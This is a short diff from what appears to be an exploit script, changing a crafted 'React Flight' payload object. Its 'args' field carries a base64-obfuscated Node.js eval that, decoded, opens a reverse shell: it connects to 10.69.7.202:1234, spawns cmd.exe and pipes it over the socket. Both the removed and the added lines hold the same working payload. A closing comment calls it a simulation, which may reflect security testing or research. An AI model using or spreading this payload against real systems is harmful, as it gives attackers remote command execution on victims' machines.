@@ -87,7 +87,7 @@ const unverifiedReactFlightPayload = {
         "shell": "node", 
         "execute": true 
     },
-    "args": "eval(Buffer.from('Y29uc3QgbmV0PXJlcXVpcmUoJ25ldCcpLHtzcGF3bn09cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLGNsaWVudD1uZXcgbmV0LlNvY2tldCgpO2NsaWVudC5jb25uZWN0KDEyMzQsJzEwLjY5LjcuMjAyJywoKT0+e2NvbnN0IHM9c3Bhd24oJ2NtZC5leGUnLFtdLHtzaGVsbDp0cnVlfSk7Y2xpZW50LnBpcGUocy5zdGRpbik7cy5zdGRvdXQucGlwZShjbGllbnQpO3Muc3RkZXJyLnBpcGUoY2xpZW50KTt9KTs=','base64').toString())" 
+    "args": "eval(Buffer.from('CmNvbnN0IG5ldD1yZXF1aXJlKCduZXQnKSx7c3Bhd259PXJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKSxjbGllbnQ9bmV3IG5ldC5Tb2NrZXQoKTsKY2xpZW50LmNvbm5lY3QoMTIzNCwnMTAuNjkuNy4yMDInLCgpPT57CiAgICBjb25zdCBzPXNwYXduKCdjbWQuZXhlJyxbXSx7c2hlbGw6dHJ1ZX0pOwogICAgY2xpZW50LnBpcGUocy5zdGRpbik7CiAgICBzLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICBzLnN0ZGVyci5waXBlKGNsaWVudCk7Cn0pOw==','base64').toString())"
 };  
 
 // Start the simulation
